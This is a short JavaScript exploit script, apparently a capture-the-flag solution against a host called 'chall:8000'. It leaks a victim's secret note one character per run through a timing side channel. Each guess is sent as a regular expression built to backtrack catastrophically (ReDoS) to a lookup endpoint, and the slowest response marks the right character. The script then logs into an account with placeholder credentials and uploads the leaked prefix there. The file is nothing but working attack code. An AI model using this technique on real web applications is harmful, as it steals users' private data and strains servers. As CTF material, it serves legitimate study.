function escapeRegExp(string) {
	return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); // $& means the whole matched string
}

let url = "http://chall:8000/";
async function sc(prefix) {
	const alphabet = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'*+,-./:;<=>?@[\\]^_{|}~ `;

	let longest_time = 0;
	let best_ch = "";

	for (let ch of alphabet) {
		const data = new URLSearchParams();
		let contains = escapeRegExp(`${prefix}${ch}`);
		data.append("contains", `^(?=${contains}.*)((.*)*)*salt$`);

		let start = new Date();
		await fetch(`${url}users/lookup_note`, {
			credentials: "same-origin",
			method: "post",
			body: data,
		}).then(async (res) => {
			let elapsed = new Date() - start;
			if (elapsed > longest_time) {
				longest_time = elapsed;
				best_ch = ch;
			}
		});
	}

	return best_ch;
}

async function f() {
	let prefix = "{PREFIX}";
	let ch = await sc(prefix);
	prefix += ch;
	let data = new URLSearchParams();
	data.append("username", "{USERNAME}");
	data.append("password", "{PASSWORD}");
	await fetch(`${url}users/login`, {
		method: "post",
		body: data,
	});

	data = new URLSearchParams();
	data.append("contents", prefix);

	fetch(`${url}users/upload_note`, {
		method: "post",
		credentials: "same-origin",
		body: data,
	});
}

f();
